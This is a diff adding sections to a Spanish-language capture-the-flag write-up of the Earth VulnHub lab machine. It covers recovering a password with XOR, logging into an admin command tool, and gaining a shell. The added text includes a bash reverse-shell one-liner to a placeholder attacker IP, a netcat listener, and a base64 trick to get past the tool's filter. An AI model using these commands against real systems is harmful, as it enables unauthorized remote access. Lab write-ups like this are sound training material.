@@ -1,4 +1,4 @@
----
+<img width="627" height="102" alt="image" src="https://github.com/user-attachments/assets/9b4319c2-1854-44c4-a6af-db0be304597a" /><img width="638" height="97" alt="image" src="https://github.com/user-attachments/assets/12972182-2b3b-4408-8ccc-162ef0c3d032" />---
 title : "Writeup - Earth Vulnhub | Sergio Castro"
 author: Sergi Castro
 date: 2025-09-10
@@ -16,6 +16,8 @@ tags: [nmap,exploits,netdiscover,]
 - [Exploración de las Páginas Web](#exploración-de-las-páginas-web)
 - [Listado de Ficheros Internos](#listado-de-ficheros-internos)
 - [Desencriptando los Mensajes](#desencriptando-los-mensajes)
+- [Accediendo y Hackeando la tool del Admin](#accediendo-y-hackeando-la-tool-del-admin)
+- [Primera Flag y Escalado de Privilegios](#primera-flag-y-escalado-de-privilegios)
 - [Conclusiones](#conclusiones)
 
 ## Introducción {#introduccion}
@@ -159,6 +161,130 @@ Vemos la clave que es un mensaje relacionado con el espacio. Ahora lo que haremo
 
 Para hacerlo podemos usar multitud de herramientas, sin embargo yo voy a usar una muy conocida llamada cyberchef, que contiene multitud de algoritmos para encriptar y desencriptar mensajes.
 
+```
+https://gchq.github.io/CyberChef
+```
+Configuramos los modulos de From Hex (ya que vamos a convertir de una cadena hexadecimal) a XOR, añadiendo después también este módulo de XOR donde le configuramos la key que obtuvimos de testdata.txt en formato UTF-8 (ya que depende de este formato), después solo le pasamos el mensaje XOR, en este caso escogí el último ya que tras probar los otros dos, no funcionó. Con esto nos muestra la clave de forma repetida varias veces siendo finalmente: earthclimatechangebad4humans para el usuario terra.
 
+<img width="1918" height="903" alt="Captura de pantalla 2025-09-14 223443" src="https://github.com/user-attachments/assets/fd644a0f-5289-405b-9bbf-bbf97d89c533" />
+
+## Accediendo y Hackeando la tool del Admin {#accediendo-y-hackeando-la-tool-del-admin}
+
+Para acceder en la tool del admin usamos el siguiente par de acceso:
+
+```
+terra:earthclimatechangebad4humans
+```
+<img width="1918" height="331" alt="image" src="https://github.com/user-attachments/assets/7552472a-5dba-4e99-9837-3d377b411fbb" />
+
+El CLI que nos proporciona es sencillo, es una tool para probar comandos de shell en la web, esto nos puede dar pistas directamente de que podemos obtener una shell reversa:
+
+<img width="1918" height="467" alt="image" src="https://github.com/user-attachments/assets/443d387e-d2af-41b3-8363-700ebaace1bb" />
+
+Por ejemplo listamos los ficheros, la idea es obtener una conexión remota usando por ejemplo netcat, para ello podemos usar esta shell sencilla:
+
+```
+sh -i >& /dev/tcp/IPmaquina-anfitrion/PUERTO 0>&1
+```
+
+- sh -i: Inicia una shell interactiva (sh en modo interactivo).
+
+- /dev/tcp/IPmaquinaremota/PUERTO: /dev/tcp/host/port es un pseudo-dispositivo especial. Permite abrir una conexión TCP directamente desde la shell hacia una dirección (IPmaquinaremota) y un puerto (PUERTO). Es decir, se conecta al puerto indicado de la máquina remota..
+
+- >& /dev/tcp/... : Redirige la salida estándar (stdout) y la salida de errores (stderr) de la shell hacia esa conexión TCP. Todo lo que imprima la shell irá por la red al puerto remoto.
+
+- 0>&1: Redirige la entrada estándar (stdin) a través de la misma conexión TCP. Así, todo lo que se escriba desde la máquina remota llega como entrada a la shell.
+
+Una vez explicado el resumen será esta la que aplicaremos en el input text del CLI. Antes de hacerlo abrimos un netcat en nuestra máquina y asignamos al puerto que le diremos a la máquina earth que se conecte, en mi caso 9001.
+
+```
+nc -lvnp 9001
+```
+
+-l → listen: poner nc en modo escucha (esperar conexiones entrantes).
+
+-v → verbose: modo verboso — muestra información extra sobre la conexión (útil para depurar).
+
+-n → numeric-only: no resuelve nombres DNS ni intenta convertir direcciones; usa directamente IPs y puertos numéricos.
+
+-p 9001 → port: especifica el puerto local en el que escuchar (en este caso el 9001).
+
+<img width="700" height="150" alt="image" src="https://github.com/user-attachments/assets/12f30085-20b7-4351-9292-7d300f8697b0" />
+
+Una vez hecho esto, vemos como al mandarle la shell directamente nos aparece: "Conexiones Remotas prohibidas", esto es porque no acepta conexiones simples, pero esto indica que podríamos encodearla de alguna forma para hacer que se la trage nuestro CLI
+
+<img width="1918" height="468" alt="image" src="https://github.com/user-attachments/assets/43c7a1fe-5f04-4653-81c1-c31531315010" />
+
+Para encodearla podemos simplemente hacerlo con base64, podemos hacerlo con un simple comando:
+
+```
+echo "sh -i >& /dev/tcp/IPAnfitrion/PUERTO 0>&1" | base64
+```
+<img width="638" height="97" alt="image" src="https://github.com/user-attachments/assets/3b88c1ab-ab8f-4052-91f5-46a345acff4b" />
+
+Nos devolverá dicho comando encriptado en base64, ahora bien para usarlo en el CLI, primero tenemos que tener habilitado el netcat (como hicimos anteriormente), y ahora aplicar el siguiente comando:
+
+```
+echo "CADENABASE64" | base64 -d | bash
+```
+Esto hará concatenación de comandos, primero hará un echo o lectura de la shell encodeada, después la decodeará con base64 -d y finalmente hará la carga de una shell bash. (añadir a la cadena base64 otro = )
+
+<img width="763" height="158" alt="image" src="https://github.com/user-attachments/assets/283aa80e-7fbf-429a-9c5e-fd36cea2f318" />
+
+Una vez hecho, veremos que netcat ha aceptado la conexión y tendremos una shell con los permisos del usuario apache. Sin embargo, si la máquina tiene disponible python podemos establecer una shell mucho más comoda pudiendo "optimizar" la que ya tenemos, para ello comprobamos si python existe usando:
+
+```
+which python
+```
+
+<img width="627" height="102" alt="image" src="https://github.com/user-attachments/assets/cffa52d2-d5b1-4c28-a534-d88fe9167e4b" />
+
+Y si existe (como es nuestro caso) podemos activar una shell mejor usando los siguientes comandos:
+
+```
+python -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+**python -c 'import pty;pty.spawn("/bin/bash")**
+
+- python -c '...' → ejecuta el código Python que pongas entre comillas desde la terminal, sin necesidad de guardar un archivo.
+
+- import pty → importa el módulo pty (pseudo-terminal) de Python.
+
+- pty.spawn("/bin/bash") → abre un proceso /bin/bash (una shell de Linux) dentro de un pseudo-terminal controlado por Python
+
+**export TERM=xterm**
+
+La variable de entorno TERM le dice al sistema qué tipo de terminal se está usando.
+
+xterm es un tipo de terminal estándar que soporta colores, desplazamiento, atajos, etc.
+
+Al exportarla, programas como vim, nano o less funcionan correctamente dentro de esa shell.
+
+Sin esto, se verian cosas raras al intentar usar programas interactivos.
+
+Una vez explicados los comandos que usaremos, los aplicaremos dentro de nuestra shell interactiva ya creada quedando el resultado final así:
+
+<img width="581" height="202" alt="image" src="https://github.com/user-attachments/assets/b23554b9-5745-4723-bb3d-070279628a8f" />
+
+Añado como ejemplo el comando ls pero como vemos ya tenemos una shell tipo bash, no es la forma más óptima pero si que nos ayuda a buscar la primera flag.
+
+## Primera Flag y Escalado de Privilegios {#primera-flag-y-escalado-de-privilegios}
+
+Primero vamos a obtener la flag del usuario simple, investigando dentro de /var/www/html no encontramos nada, como podemos ver aquí:
+
+<img width="627" height="256" alt="image" src="https://github.com/user-attachments/assets/90092dfd-2015-49df-bce1-30ad0456a8c0" />
+
+Solo vemos los ficheros que ya conociamos anteriormente, por lo que hay no puede estar, si retrocedemos un par de directorios hasta var podemos ver:
+
+<img width="726" height="136" alt="image" src="https://github.com/user-attachments/assets/4c996f82-ee19-4892-9fc3-fda6293b530c" />
+
+Vemos un directorio llamado earth_web y en su interior:
+
+<img width="840" height="187" alt="image" src="https://github.com/user-attachments/assets/03f1111b-b446-4f3f-bc03-59e664124f62" />
+
+Entre muchos ficheros encontramos la flag del usuario finalmente.
+
+Ahora bien para poder escalar los privilegios, comprobaremos los SUID de los binarios de los sistemas que al igual que en jangow es una buena práctica de inicio, lo haremos usando el mismo comando de la anterior máquina.
 
 ## Conclusiones {#conclusiones}
